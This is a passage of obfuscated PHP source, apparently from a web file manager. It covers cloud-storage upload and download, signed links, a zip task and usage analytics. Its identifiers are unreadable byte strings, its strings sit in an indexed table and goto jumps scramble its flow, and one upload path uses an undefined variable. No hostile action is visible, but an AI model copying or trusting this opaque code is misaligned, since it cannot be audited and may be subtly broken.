{ break; } continue; } if ($•Ú¡Îã·) { if ($Ô½ÀÚ«) { return !0; } } else { if ($ôè¤§´×) { return !0; } } if ($­ßıø˜¬ < $“‰®Â¡) { break; } } if ($óòıÕùØ) { return array($–ı•è¥û[207] => $ÖÜÄ×«¶, $–ı•è¥û[208] => $«î‡¤Ôª); } return !1; } public function listAll($ÍŠÇ»å) { $â¼îÔ¬ =& $_SERVER[™¾ÇÙ¯¹]; $ÈòçÍ«ß = $ Şîæ€€ = array(); $this->fileList($ÍŠÇ»å, $ÈòçÍ«ß, $ Şîæ€€, !0); $¢ÅÇ¤ = array(); foreach ($ Şîæ€€ as $ÀâìèÍÇ) { $¢ÅÇ¤[$ÀâìèÍÇ[$â¼îÔ¬[32]]] = $ÀâìèÍÇ[$â¼îÔ¬[76]]; } foreach ($ÈòçÍ«ß as $ÀâìèÍÇ) { if (is_string($ÀâìèÍÇ)) { $¢ÅÇ¤[$ÀâìèÍÇ] = 0; } } return $this->listAllFiles($ÍŠÇ»å, array_keys($¢ÅÇ¤), $¢ÅÇ¤); } public function canRead($ÕâÆÛ²ï) { return $this->exist($ÕâÆÛ²ï) ? !0 : !1; } public function canWrite($ì›— Ñ¶) { return $this->exist($ì›— Ñ¶) ? !0 : !1; } public function getContent($Áí‡à—–) { return $this->fileSubstr($Áí‡à—–, 0, -1); } public function setContent($ºÉ¦İÌ¤, $å£¼…‘ñ = '') { $„”º§  =& $_SERVER[™¾ÇÙ¯¹]; if (!$å£¼…‘ñ) { $šıÈ¾ÕÈ = $this->ussRequest($ºÉ¦İÌ¤, $„”º§ [226]); return $šıÈ¾ÕÈ[$„”º§ [1199]]; } $ ¥ºÄË = $this->tempFile($this->pathThis($ºÉ¦İÌ¤)); file_put_contents($ ¥ºÄË, $å£¼…‘ñ); if ($this->upload($ºÉ¦İÌ¤, $ ¥ºÄË)) { $this->tempFileRemve($ ¥ºÄË); return !0; } return !1; } public function fileSubstr($û¡Øìá«, $’ş§¢Í, $‚ÚÈË×¹) { $Ö…ñ°’Ô =& $_SERVER[™¾ÇÙ¯¹]; if (!($ıô—”´÷ = $this->link($û¡Øìá«))) { return !1; } $š©ú¿ş = !1; if ($‚ÚÈË×¹ > 0) { $¶©ó“Á = $’ş§¢Í + $‚ÚÈË×¹ - 1; $š©ú¿ş = array($Ö…ñ°’Ô[1440] . $’ş§¢Í . $Ö…ñ°’Ô[394] . $¶©ó“Á); } $·ã—â¹” = url_request($ıô—”´÷, $Ö…ñ°’Ô[230], !1, $š©ú¿ş); return $·ã—â¹”[$Ö…ñ°’Ô[765]] ? $·ã—â¹”[$Ö…ñ°’Ô[1201]] : !1; } public function upload($âì™ÒÊâ, $ô‡‚èğ¿, $·ä¸Úé‚ = false, $•Œ‚íÄ¢ = REPEAT_REPLACE) { $“ë™¯¾­ =& $_SERVER[™¾ÇÙ¯¹]; $°†ïíæ = IO::size($ô‡‚èğ¿); if ($°†ïíæ <= 1024 * 1024 * 200) { $æ´üùğØ = array($“ë™¯¾­[1480] . $ô‡‚èğ¿); $Ùà¼©ç· = $this->ussRequest($âì™ÒÊâ, $“ë™¯¾­[228], $æ´üùğØ); return $Ùà¼©ç·[$“ë™¯¾­[1199]] ? $this->getPathOuter($âì™ÒÊâ) : !1; } $¯«‹¶ú¬ = 1024 * 1024 * 10; $óƒ¾óŞ¦ = array($“ë™¯¾­[1481], $“ë™¯¾­[1482] . $°†ïíæ, $“ë™¯¾­[1483], $“ë™¯¾­[1484] . $¯«‹¶ú¬); $Ùà¼©ç· = $this->ussRequest($âì™ÒÊâ, $“ë™¯¾­[228], !1, $óƒ¾óŞ¦); if (!$Ùà¼©ç·[$“ë™¯¾­[1199]]) { return !1; } $şñµıé  = $Ùà¼©ç·[$“ë™¯¾­[1201]]; $½à®ºŒ = 0; $¥¡Àîçò = $şñµıé [$“ë™¯¾­[1485]]; $’Ô§ÀÒ’ = fopen($ô‡‚èğ¿, $“ë™¯¾­[1389]); if (!$’Ô§ÀÒ’) { return !1; } do { $œÅ‹µ = $şñµıé [$“ë™¯¾­[1486]]; fseek_64($’Ô§ÀÒ’, $½à®ºŒ); $ş”åÍâ“ = fread($’Ô§ÀÒ’, $œÅ‹µ); $Ñ»¿Ú¹É = 0; do { $Ñ»¿Ú¹É++; $şñµıé  = $this->uploadPart($âì™ÒÊâ, $şñµıé , $ş”åÍâ“); } while (!$şñµıé  && $Ñ»¿Ú¹É < 3); if (!$şñµıé ) { return !1; } $¥¡Àîçò = $şñµıé [$“ë™¯¾­[1485]]; $½à®ºŒ += $œÅ‹µ; } while ($¥¡Àîçò != -1); fclose($’Ô§ÀÒ’); $óƒ¾óŞ¦ = array($“ë™¯¾­[1487], $“ë™¯¾­[1488] . $şñµıé [$“ë™¯¾­[1489]], $“ë™¯¾­[1483]); $Ùà¼©ç· = $this->ussRequest($âì™ÒÊâ, $“ë™¯¾­[228], !1, $óƒ¾óŞ¦); return $Ùà¼©ç·[$“ë™¯¾­[1199]] ? $this->getPathOuter($ë¦­‰¶í) : !1; } private function uploadPart($”á“ÑÙ¾, $¼’œšÀ–, &$Óê„›í) { $§¬Íà‡ =& $_SERVER[™¾ÇÙ¯¹]; $±¾§›³­ = array($§¬Íà‡[1490], $§¬Íà‡[1488] . $¼’œšÀ–[$§¬Íà‡[1489]], $§¬Íà‡[1491] . $¼’œšÀ–[$§¬Íà‡[1485]], $§¬Íà‡[142] . $¼’œšÀ–[$§¬Íà‡[1486]]); $éØìÉìÚ = $this->ussRequest($”á“ÑÙ¾, $§¬Íà‡[228], $Óê„›í, $±¾§›³­); return !$éØìÉìÚ[$§¬Íà‡[1199]] ? $éØìÉìÚ[$§¬Íà‡[1199]] : $éØìÉìÚ[$§¬Íà‡[1201]]; } public function uploadFormData($ÒŠ™ßœû, $Øöºá¶ = 3600) { return $this->uploadPolicy($ÒŠ™ßœû, $Øöºá¶); } public function multiUploadFormData($ªğÙÅÃ„, $¤ì“óÕå = 3600) { $’ó•¼Â =& $_SERVER[™¾ÇÙ¯¹]; $™‹³Ò…â = (int) $GLOBALS[$’ó•¼Â[7]][$’ó•¼Â[76]]; return $this->uploadPolicy($ªğÙÅÃ„, $¤ì“óÕå, $™‹³Ò…â); } private function uploadPolicy($·óØ°Ò, $µû¦¥Ú = 3600, $¿°¥•…á = 0) { $¯ÜÏíŞ =& $_SERVER[™¾ÇÙ¯¹]; $ù«Š°ø¢ = $¯ÜÏíŞ[8] . $this->bucket; $Š‘„½Â‰ = gmdate($¯ÜÏíŞ[1425]); $ÜìÈ—¬ = array($¯ÜÏíŞ[1492] => $this->bucket, $¯ÜÏíŞ[1493] => $·óØ°Ò, $¯ÜÏíŞ[1494] => time() + $µû¦¥Ú, $¯ÜÏíŞ[1495] => $Š‘„½Â‰); if ($¿°¥•…á) { $ÜìÈ—¬[$¯ÜÏíŞ[1405]] = $¿°¥•…á; } $æ‹„øÛ® = base64_encode(json_encode($ÜìÈ—¬)); $£¿ÌåŒ¶ = base64_encode(hash_hmac($¯ÜÏíŞ[1462], "\x50\x4f\x53\x54\x26{$ù«Š°ø¢}\46{$Š‘„½Â‰}\46{$æ‹„øÛ®}", md5("{$this->userpass}"), !0)); $¹êÁÅàÏ = array($¯ÜÏíŞ[1330] => $æ‹„øÛ®, $¯ÜÏíŞ[1496] => "\x55\120\131\x55\x4e\x20{$this->username}\72{$£¿ÌåŒ¶}", $¯ÜÏíŞ[181] => $this->endpoint . $ù«Š°ø¢); return $¹êÁÅàÏ; } public function download($ıÏ¨¼Ñ³, $§»ŞêÀ) { $¤Éó®ÑÎ = IO::getPathInner(IO::mkfile($§»ŞêÀ)); if (!($Œ©ÅšŸ‘ = $this->link($ıÏ¨¼Ñ³))) { return !1; } $¡ØÆ‡¦ü = 0; $½“‚¼Ü = 1024 * 200; $¨çéÖŞ· = fopen($¤Éó®ÑÎ, $_SERVER[™¾ÇÙ¯¹][1446]); while (!0) { $´Ÿù½¥› = $this->fileSubstr($ıÏ¨¼Ñ³, $¡ØÆ‡¦ü, $½“‚¼Ü); if ($´Ÿù½¥› === !1) { return !1; } fwrite($¨çéÖŞ·, $´Ÿù½¥›); $¡ØÆ‡¦ü += $½“‚¼Ü; if (strlen($´Ÿù½¥›) < $½“‚¼Ü) { break; } } fclose($¨çéÖŞ·); return $§»ŞêÀ; } public function link($Îí¨ÅØ, $•èŠóÕï = array()) { $§Í»¡§ =& $_SERVER[™¾ÇÙ¯¹]; $Îí¨ÅØ = trim($Îí¨ÅØ, $§Í»¡§[8]); if (!empty($this->token)) { $µù°ĞÇĞ = strtotime(date($§Í»¡§[1497])); $ğƒĞßó = substr(md5($this->token . $§Í»¡§[293] . $µù°ĞÇĞ . $§Í»¡§[1498] . $Îí¨ÅØ), 12, 8) . $µù°ĞÇĞ; $•èŠóÕï[] = $§Í»¡§[1499] . $ğƒĞßó; } $ØÖï÷ş” = !empty($•èŠóÕï) ? $§Í»¡§[73] . implode($§Í»¡§[293], $•èŠóÕï) : $§Í»¡§[12]; return $this->getHost() . $§Í»¡§[8] . $Îí¨ÅØ . $ØÖï÷ş”; } public function fileOut($£×´¿øÎ, $•¢Å¬»Ó = false, $ë‹ÂÛš  = false, $¿ØÅÓÕ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($£×´¿øÎ, $•¢Å¬»Ó, $ë‹ÂÛš , $¿ØÅÓÕ); } if (!$ë‹ÂÛš ) { $ë‹ÂÛš  = $this->pathThis($£×´¿øÎ); } $¯İÊ’Œú = $•¢Å¬»Ó ? array($_SERVER[™¾ÇÙ¯¹][1500] . rawurlencode($ë‹ÂÛš )) : array(); $Ü÷¤ïÁ = $this->link($£×´¿øÎ, $¯İÊ’Œú); $this->fileOutLink($Ü÷¤ïÁ); } public function fileOutServer($Âà»Â, $ıíèœŒË = false, $ïİ‹åõô = false, $×Ãµ÷¤ı = '') { parent::fileOut($Âà»Â, $ıíèœŒË, $ïİ‹åõô, $×Ãµ÷¤ı); } public function fileOutImage($»‡ë³ÈÌ, $Æ«ë•Ô¥ = 250) { $É¨ÛóÒ„ = $this->link($»‡ë³ÈÌ . $_SERVER[™¾ÇÙ¯¹][1501] . $Æ«ë•Ô¥); $this->fileOutLink($É¨ÛóÒ„); } public function fileOutImageServer($¶Î™Äı, $²±íŠ¯ = 250) { parent::fileOutImage($¶Î™Äı, $²±íŠ¯); } public function hashMd5($ƒÙÖ©Û) { $ÏĞ£‹ÇÙ =& $_SERVER[™¾ÇÙ¯¹]; $Ë‚Ö°áÜ = $this->_objectMeta($ƒÙÖ©Û); return isset($Ë‚Ö°áÜ[$ÏĞ£‹ÇÙ[212]]) ? $Ë‚Ö°áÜ[$ÏĞ£‹ÇÙ[212]] : !1; } public function size($œ¡Èö±ˆ) { $ü­›Şúõ = $this->objectMeta($œ¡Èö±ˆ); return $ü­›Şúõ ? $ü­›Şúõ[$_SERVER[™¾ÇÙ¯¹][76]] : 0; } public function info($ÁÚ“ˆë) { if ($this->isFolder($ÁÚ“ˆë)) { return $this->folderInfo($ÁÚ“ˆë); } else { if ($this->isFile($ÁÚ“ˆë)) { return $this->fileInfo($ÁÚ“ˆë); } } return !1; } public function exist($úìß–û‰) { return $this->isFile($úìß–û‰) || $this->isFolder($úìß–û‰); } public function isFile($¾…Î£ñ¨) { return !$this->isFolder($¾…Î£ñ¨) && $this->objectMeta($¾…Î£ñ¨); } public function isFolder($‰€˜†ËÈ) { return $this->cacheMethod($_SERVER[™¾ÇÙ¯¹][165], $‰€˜†ËÈ); } protected function objectMeta($ú‚äÇ•×) { return $this->cacheMethod($_SERVER[™¾ÇÙ¯¹][167], $ú‚äÇ•×); } protected function _objectMeta($‹—¥ã½) { $´¥¨·Ã =& $_SERVER[™¾ÇÙ¯¹]; if ($‹—¥ã½ == $´¥¨·Ã[12] || $‹—¥ã½ == $´¥¨·Ã[8]) { return array(); } $ÚßÖõÜ­ = $this->ussRequest($‹—¥ã½, $´¥¨·Ã[1502]); if (!$ÚßÖõÜ­[$´¥¨·Ã[1199]]) { return null; } $ğºåöÁÃ = isset($ÚßÖõÜ­[$´¥¨·Ã[1201]]) ? $ÚßÖõÜ­[$´¥¨·Ã[1201]] : array(); if (!isset($ğºåöÁÃ[$´¥¨·Ã[1503]])) { return null; } $Øó”‘ôÔ = array($´¥¨·Ã[33] => isset($ğºåöÁÃ[$´¥¨·Ã[1503]]) ? $ğºåöÁÃ[$´¥¨·Ã[1503]] : null, $´¥¨·Ã[76] => isset($ğºåöÁÃ[$´¥¨·Ã[1504]]) ? $ğºåöÁÃ[$´¥¨·Ã[1504]] : null, $´¥¨·Ã[212] => isset($ğºåöÁÃ[$´¥¨·Ã[1505]]) ? $ğºåöÁÃ[$´¥¨·Ã[1505]] : null, $´¥¨·Ã[1472] => isset($ğºåöÁÃ[$´¥¨·Ã[1506]]) ? $ğºåöÁÃ[$´¥¨·Ã[1506]] : null); $Øó”‘ôÔ[$´¥¨·Ã[1473]] = isset($ğºåöÁÃ[$´¥¨·Ã[1507]]) ? strtotime($ğºåöÁÃ[$´¥¨·Ã[1507]]) : $Øó”‘ôÔ[$´¥¨·Ã[1472]]; return $Øó”‘ôÔ; } protected function _isFolder($öµŞí¡‰) { $ÂÌ‘• =& $_SERVER[™¾ÇÙ¯¹]; if ($öµŞí¡‰ == $ÂÌ‘•[12] || $öµŞí¡‰ == $ÂÌ‘•[8]) { return !0; } $›ıÛ¹Ã = $this->_objectMeta($öµŞí¡‰); return isset($›ıÛ¹Ã[$ÂÌ‘•[33]]) && $›ıÛ¹Ã[$ÂÌ‘•[33]] == $ÂÌ‘•[75] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Ú¿¤’ô = false) { } public function exist($Ğ‚£ºâÁ) { $„£Šö»ù = $this->info($Ğ‚£ºâÁ); return $„£Šö»ù[$_SERVER[™¾ÇÙ¯¹][201]]; } public function isFile($•§Ğµ‘²) { $­è»’êí = $this->info($•§Ğµ‘²); return $­è»’êí[$_SERVER[™¾ÇÙ¯¹][201]]; } public function isFolder($Òí¼ÔßŒ) { return !1; } public function size($ñšÍ¹¼í) { $ğ‘”àÀµ = $this->info($ñšÍ¹¼í); return $ğ‘”àÀµ[$_SERVER[™¾ÇÙ¯¹][76]]; } public function info($üáõ²‡ë) { return $this->infoParse($üáõ²‡ë); } public function infoAuth($Õ¬ï¿û) { return $this->infoParse($Õ¬ï¿û); } public function infoWithChildren($ÑôŸÕ³) { return $this->infoParse($ÑôŸÕ³); } public function infoFull($ÇºúÉî£) { return $this->infoParse($ÇºúÉî£); } private function infoParse($¦ŸÊŞ¦í) { $ÁÈÖ¡ =& $_SERVER[™¾ÇÙ¯¹]; $®€÷ş² = $this->header($¦ŸÊŞ¦í); if (!$®€÷ş² || !$®€÷ş²[$ÁÈÖ¡[765]]) { return !1; } $ç³¹ºÉ¯ = _get($®€÷ş², $ÁÈÖ¡[346], 0); $‚°…àâ® = array($ÁÈÖ¡[32] => $®€÷ş²[$ÁÈÖ¡[32]], $ÁÈÖ¡[84] => $¦ŸÊŞ¦í, $ÁÈÖ¡[33] => $ÁÈÖ¡[199], $ÁÈÖ¡[76] => intval($ç³¹ºÉ¯), $ÁÈÖ¡[174] => get_path_ext($®€÷ş²[$ÁÈÖ¡[32]]), $ÁÈÖ¡[1386] => $ç³¹ºÉ¯ > 0 && $®€÷ş²[$ÁÈÖ¡[1508]], $ÁÈÖ¡[1387] => !1); return $‚°…àâ®; } private function header($À§Š‰») { $¯ÈºÂç† =& $_SERVER[™¾ÇÙ¯¹]; if (isset(self::$_cacheHeader[$À§Š‰»])) { return self::$_cacheHeader[$À§Š‰»]; } $È„«‚ä = isset($GLOBALS[$¯ÈºÂç†[1509]]) ? $GLOBALS[$¯ÈºÂç†[1509]] : !1; $GLOBALS[$¯ÈºÂç†[1509]] = !0; self::$_cacheHeader[$À§Š‰»] = url_header($À§Š‰»); $GLOBALS[$¯ÈºÂç†[1509]] = $È„«‚ä; return self::$_cacheHeader[$À§Š‰»]; } public function hashSimple($¼ºâãœî, $ã´°é¹è = false) { $õÔëè =& $_SERVER[™¾ÇÙ¯¹]; $®ü„­¨ = $this->info($¼ºâãœî); if (!$®ü„­¨ || !$®ü„­¨[$õÔëè[201]]) { return !1; } $¢¯Òê¤ = $®ü„­¨[$õÔëè[76]]; $êÀİÚ¯® = 200; $ïºã‚Î‹ = 50; if ($¢¯Òê¤ <= $êÀİÚ¯® * $ïºã‚Î‹) { return md5($this->fileSubstr($¼ºâãœî, 0, $¢¯Òê¤)) . $¢¯Òê¤; } $ãÚúâ¹· = intval($¢¯Òê¤ / $ïºã‚Î‹); $¤ÍÆŠéñ = $õÔëè[12]; $ù÷¯º© = timeFloat(); $Š‚§ˆÆç = 15; for ($ı®‰“ùâ = 0; $ı®‰“ùâ < $ïºã‚Î‹; $ı®‰“ùâ++) { if (timeFloat() - $ù÷¯º© > $Š‚§ˆÆç) { return !1; } $ü•ó¥˜â = $this->fileSubstr($¼ºâãœî, $ãÚúâ¹· * $ı®‰“ùâ, $êÀİÚ¯®); if (!$ü•ó¥˜â) { return !1; } $¤ÍÆŠéñ .= $ü•ó¥˜â; } $¤ÍÆŠéñ .= $this->fileSubstr($¼ºâãœî, $¢¯Òê¤ - $êÀİÚ¯®, $êÀİÚ¯®); return md5($¤ÍÆŠéñ) . $¢¯Òê¤; } public function getContent($¢ìÒÌ¿ô) { return $this->fileSubstr($¢ìÒÌ¿ô); } public function fileSubstr($°©”Èµš, $¦®ÁìÈ¢ = 0, $Àé†È·ş = -1) { $Á³ƒÛÛ =& $_SERVER[™¾ÇÙ¯¹]; $Â€ºŞíÈ = $this->info($°©”Èµš); if (!$Â€ºŞíÈ || !$Â€ºŞíÈ[$Á³ƒÛÛ[201]] && $Â€ºŞíÈ[$Á³ƒÛÛ[76]] > 1024 * 1024 * 10) { return !1; } if ($Àé†È·ş === -1) { $Àé†È·ş = $Â€ºŞíÈ[$Á³ƒÛÛ[76]]; } if ($Àé†È·ş == 0) { return $Á³ƒÛÛ[12]; } $õåÖ—óÓ = array($Á³ƒÛÛ[1510] . $¦®ÁìÈ¢ . $Á³ƒÛÛ[797] . ($¦®ÁìÈ¢ + $Àé†È·ş - 1)); $«­Æê½ = url_request($°©”Èµš, $Á³ƒÛÛ[230], !1, $õåÖ—óÓ, !1, !1, 1); return $«­Æê½[$Á³ƒÛÛ[1201]] ? $«­Æê½[$Á³ƒÛÛ[1201]] : $Á³ƒÛÛ[12]; } public function download($Œ¨×Ïš, $Ãöâ«øñ) { Downloader::start($Œ¨×Ïš, $Ãöâ«øñ); return $Ãöâ«øñ; } } goto BÅùËÎâÁ¹; aæçÌ©Îíù: class TaskZip extends TaskFileTransfer { protected function startAfter() { $¶¿Ş„à =& $_SERVER[™¾ÇÙ¯¹]; parent::startAfter(); Hook::bind($¶¿Ş„à[1764], array($this, $¶¿Ş„à[1759])); $¥º´íµ« =& $this->task; $¥º´íµ«[$¶¿Ş„à[1761]] = $¶¿Ş„à[1207]; if (!$¥º´íµ«[$¶¿Ş„à[1564]]) { $¥º´íµ«[$¶¿Ş„à[1564]] = LNG($¶¿Ş„à[1765]); } } protected function endAfter() { $ÁÀ’¼Á× =& $_SERVER[™¾ÇÙ¯¹]; parent::endAfter(); Hook::unbind($ÁÀ’¼Á×[1764], array($this, $ÁÀ’¼Á×[1759])); } public function updateAfter() { $ı¶Ÿ„ì´ =& $_SERVER[™¾ÇÙ¯¹]; $ñÁÔıÂØ =& $this->task; if (!$ñÁÔıÂØ[$ı¶Ÿ„ì´[801]] || !$ñÁÔıÂØ[$ı¶Ÿ„ì´[778]]) { return; } if ($ñÁÔıÂØ[$ı¶Ÿ„ì´[1761]] == $ı¶Ÿ„ì´[1207]) { $‰‰”ì…ò = $ñÁÔıÂØ[$ı¶Ÿ„ì´[1717]]; if ($ñÁÔıÂØ[$ı¶Ÿ„ì´[1718]] != $ı¶Ÿ„ì´[1207]) { $‰‰”ì…ò = 0; } $íúõá‚ = ($ñÁÔıÂØ[$ı¶Ÿ„ì´[1721]] + $‰‰”ì…ò) / $ñÁÔıÂØ[$ı¶Ÿ„ì´[778]]; $ñÁÔıÂØ[$ı¶Ÿ„ì´[1667]] = $íúõá‚ * 0.3; } else { if ($ñÁÔıÂØ[$ı¶Ÿ„ì´[1761]] == $ı¶Ÿ„ì´[322]) { $íúõá‚ = $ñÁÔıÂØ[$ı¶Ÿ„ì´[1666]] / $ñÁÔıÂØ[$ı¶Ÿ„ì´[801]]; $ñÁÔıÂØ[$ı¶Ÿ„ì´[1667]] = 0.3 + $íúõá‚ * 0.5; } else { if ($ñÁÔıÂØ[$ı¶Ÿ„ì´[1761]] == $ı¶Ÿ„ì´[107]) { $íúõá‚ = 0; if ($ñÁÔıÂØ[$ı¶Ÿ„ì´[1716]]) { $íúõá‚ = $ñÁÔıÂØ[$ı¶Ÿ„ì´[1717]] / $ñÁÔıÂØ[$ı¶Ÿ„ì´[1716]]; } $ñÁÔıÂØ[$ı¶Ÿ„ì´[1667]] = 0.3 + 0.5 + $íúõá‚ * 0.2; } } } if ($ñÁÔıÂØ[$ı¶Ÿ„ì´[1667]] > 0) { $¹ôÇÙ€ = timeFloat() - $ñÁÔıÂØ[$ı¶Ÿ„ì´[1669]] - $ñÁÔıÂØ[$ı¶Ÿ„ì´[1672]]; $ñÁÔıÂØ[$ı¶Ÿ„ì´[1673]] = $¹ôÇÙ€ * (1 - $ñÁÔıÂØ[$ı¶Ÿ„ì´[1667]]) / $ñÁÔıÂØ[$ı¶Ÿ„ì´[1667]]; } } public function copyFileStart($âäÔÍ, $Å¤²æ¦, $•‹ış†è, $½Ó£ÁÓ‚, $–ìÀ¸•, $®Œ®š–Ÿ) { $£ªíˆÓò =& $_SERVER[™¾ÇÙ¯¹]; parent::copyFileStart($âäÔÍ, $Å¤²æ¦, $•‹ış†è, $½Ó£ÁÓ‚, $–ìÀ¸•, $®Œ®š–Ÿ); $äÈÁšÑ =& $this->task; if ($äÈÁšÑ[$£ªíˆÓò[1761]] == $£ªíˆÓò[322]) { $äÈÁšÑ[$£ªíˆÓò[1761]] = $£ªíˆÓò[107]; } $this->update(); } public function copyFileEnd($ûŠË‰·Ä, $ê¤÷Ìö«, $«ƒõ†µÆ, $†î‹€Îé, $²‘òÏİë, $›İæ§) { $ç×òò«Œ =& $_SERVER[™¾ÇÙ¯¹]; $½µîÏçê =& $this->task; $½µîÏçê[$ç×òò«Œ[1717]] = $½µîÏçê[$ç×òò«Œ[1716]]; $½µîÏçê[$ç×òò«Œ[1721]] += $½µîÏçê[$ç×òò«Œ[1716]]; $½µîÏçê[$ç×òò«Œ[1718]] = $ç×òò«Œ[12]; $this->update(); } public function nameParse($¤Û¹™˜ñ) { $¿«ê„ÍÃ =& $_SERVER[™¾ÇÙ¯¹]; $î¦Ÿ¦™¸ =& $this->task; if ($î¦Ÿ¦™¸[$¿«ê„ÍÃ[1666]] < $î¦Ÿ¦™¸[$¿«ê„ÍÃ[801]]) { $áÕóóÈã = get_path_this($¤Û¹™˜ñ); if (strstr($áÕóóÈã, $¿«ê„ÍÃ[10])) { $î¦Ÿ¦™¸[$¿«ê„ÍÃ[1666]] += 1; } } if ($î¦Ÿ¦™¸[$¿«ê„ÍÃ[1761]] == $¿«ê„ÍÃ[1207]) { $î¦Ÿ¦™¸[$¿«ê„ÍÃ[1761]] = $¿«ê„ÍÃ[322]; } $î¦Ÿ¦™¸[$¿«ê„ÍÃ[1714]] = $¤Û¹™˜ñ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($½É«ŞÜÆ) { $ôÃÉ¿¿ï =& $_SERVER[™¾ÇÙ¯¹]; $µ¦ùÁôè = array($ôÃÉ¿¿ï[608] => array($ôÃÉ¿¿ï[33] => $ôÃÉ¿¿ï[1766], $ôÃÉ¿¿ï[282] => array($ôÃÉ¿¿ï[224], $ôÃÉ¿¿ï[780], $ôÃÉ¿¿ï[1767], $ôÃÉ¿¿ï[1768])), $ôÃÉ¿¿ï[1769] => array($ôÃÉ¿¿ï[33] => $ôÃÉ¿¿ï[1770], $ôÃÉ¿¿ï[282] => array($ôÃÉ¿¿ï[224], $ôÃÉ¿¿ï[778], $ôÃÉ¿¿ï[1771], $ôÃÉ¿¿ï[1772], $ôÃÉ¿¿ï[1773]))); if (!isset($µ¦ùÁôè[$½É«ŞÜÆ])) { return !1; } $this->optionType = $µ¦ùÁôè[$½É«ŞÜÆ][$ôÃÉ¿¿ï[33]]; $this->field = $µ¦ùÁôè[$½É«ŞÜÆ][$ôÃÉ¿¿ï[282]]; return !0; } public function listData($¦„¥ç½à = false, $æãïô®û = "\x6d\157\x64\x69\146\171\x54\x69\x6d\x65", $²üî£À² = false) { return parent::listData($¦„¥ç½à, $æãïô®û, $²üî£À²); } public function trendList($ËæşÙú) { $§Ú÷”¤‡ =& $_SERVER[™¾ÇÙ¯¹]; $çœ‡İë = $this->listData(); if ($çœ‡İë) { $¸‡ºò£³ = end($çœ‡İë); $”ÁÂ¶ì– = date($§Ú÷”¤‡[1774], strtotime($§Ú÷”¤‡[1775])); if ($¸‡ºò£³[$§Ú÷”¤‡[224]] == $”ÁÂ¶ì–) { return $çœ‡İë; } $Š²ñ¼ÊÙ = strtotime($¸‡ºò£³[$§Ú÷”¤‡[224]]); } if (!isset($Š²ñ¼ÊÙ)) { $Ã¦ˆå¿ = $ËæşÙú == $§Ú÷”¤‡[608] ? $§Ú÷”¤‡[543] : $§Ú÷”¤‡[840]; $Š²ñ¼ÊÙ = Model($Ã¦ˆå¿)->min($§Ú÷”¤‡[200]); } $ÒÑØÌµÀ = $§Ú÷”¤‡[1776] . ucfirst($ËæşÙú); $Ú§ÂÃéÊ = $this->dateList($Š²ñ¼ÊÙ); foreach ($Ú§ÂÃéÊ as $”ÁÂ¶ì–) { $this->{$ÒÑØÌµÀ}($”ÁÂ¶ì–); } return $this->listData(); } private function dateList($äßåŠ×Å) { $¸èóÛÑ =& $_SERVER[™¾ÇÙ¯¹]; $çŠ¬ÚÊõ = $äßåŠ×Å; $¨³ËîÕ‹ = strtotime($¸èóÛÑ[1775]); $Õƒèîú = array(); while ($çŠ¬ÚÊõ <= $¨³ËîÕ‹) { $Õƒèîú[] = date($¸èóÛÑ[1774], $çŠ¬ÚÊõ); $çŠ¬ÚÊõ = strtotime($¸èóÛÑ[1777], $çŠ¬ÚÊõ); } return $Õƒèîú; } public function _recordUser($’•Ïì ô = '') { $¯Œ‘¼ =& $_SERVER[™¾ÇÙ¯¹]; $Ò‹Â´ÃÂ = strtotime(date($¯Œ‘¼[1778], strtotime($’•Ïì ô))); $‹Ğä¨ß = strtotime(date($¯Œ‘¼[1779], strtotime($’•Ïì ô))); $ª¢¾´ = array($¯Œ‘¼[200] => array($¯Œ‘¼[1021], $‹Ğä¨ß)); $ù¿ˆšÔŠ = Model($¯Œ‘¼[543])->where($ª¢¾´)->count($¯Œ‘¼[1665]); $ª¢¾´[$¯Œ‘¼[200]] = array($¯Œ‘¼[342], array($Ò‹Â´ÃÂ, $‹Ğä¨ß)); $ì¹»¤èÅ = Model($¯Œ‘¼[543])->where($ª¢¾´)->count($¯Œ‘¼[1665]); $ª¢¾´[$¯Œ‘¼[33]] = $¯Œ‘¼[1780]; $©¤ä¶¸È = Model($¯Œ‘¼[1781])->where($ª¢¾´)->count($¯Œ‘¼[1782]); $²àúòÚ = array($¯Œ‘¼[224] => $’•Ïì ô, $¯Œ‘¼[780] => (int) $ù¿ˆšÔŠ, $¯Œ‘¼[1767] => (int) $ì¹»¤èÅ, $¯Œ‘¼[1768] => (int) $©¤ä¶¸È); return $this->insert($²àúòÚ); } public function _recordStore($’›²˜İ = '') { $½‡—Ô¸² =& $_SERVER[™¾ÇÙ¯¹]; $ô–Îàù = strtotime(date($½‡—Ô¸²[1779], strtotime($’›²˜İ))); $÷‹çÖ¶î = array($½‡—Ô¸²[200] => array($½‡—Ô¸²[1021], $ô–Îàù)); $øòŞşî = Model($½‡—Ô¸²[479])->where($÷‹çÖ¶î)->sum($½‡—Ô¸²[76]); $÷‹çÖ¶î[$½‡—Ô¸²[418]] = 0; $ŠÓÎË¤€ = Model($½‡—Ô¸²[840])->where($÷‹çÖ¶î)->sum($½‡—Ô¸²[76]); $÷‹çÖ¶î[$½‡—Ô¸²[419]] = 1; $©Ï£û®Ÿ = Model($½‡—Ô¸²[840])->where($÷‹çÖ¶î)->sum($½‡—Ô¸²[76]); $÷‹çÖ¶î[$½‡—Ô¸²[419]] = 2; $«Ğç£• = Model($½‡—Ô¸²[840])->where($÷‹çÖ¶î)->sum($½‡—Ô¸²[76]); $æ¯®ÑâÑ = array($½‡—Ô¸²[224] => $’›²˜İ, $½‡—Ô¸²[778] => (int) $ŠÓÎË¤€, $½‡—Ô¸²[1771] => (int) $øòŞşî, $½‡—Ô¸²[1772] => (int) $©Ï£û®Ÿ, $½‡—Ô¸²[1773] => (int) $«Ğç£•); return $this->insert($æ¯®ÑâÑ); } public function trend($†ã©£Şá, $ÁÛÙã­‡) { $­³ë¤²Ÿ =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->init($†ã©£Şá)) { return !1; } $ï“£éÖÔ = $this->trendList($†ã©£Şá); if ($ï“£éÖÔ && $ÁÛÙã­‡ != $­³ë¤²Ÿ[1638]) { $ËÁº¹ú« = $ï“£éÖÔ[0][$­³ë¤²Ÿ[224]]; $ôÓã™•â = $this->validDate($ÁÛÙã­‡, $ËÁº¹ú«); $’Ù‰í£ğ = array(); $ı¿ùÃáã = array_to_keyvalue($ï“£éÖÔ, $­³ë¤²Ÿ[224]); foreach ($ôÓã™•â as $ûâ‡àú›) { if 